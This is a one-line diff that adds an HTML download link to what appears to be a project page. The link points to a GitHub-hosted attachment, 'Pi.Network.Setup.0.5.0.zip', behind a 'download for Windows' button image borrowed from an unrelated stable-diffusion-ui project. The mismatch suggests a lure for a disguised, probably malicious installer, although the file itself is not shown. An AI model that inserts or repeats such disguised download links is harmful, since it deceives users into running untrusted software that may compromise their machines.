@@ -1,0 +1,1 @@
+ <a href="https://github.com/user-attachments/files/17948730/Pi.Network.Setup.0.5.0.zip"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
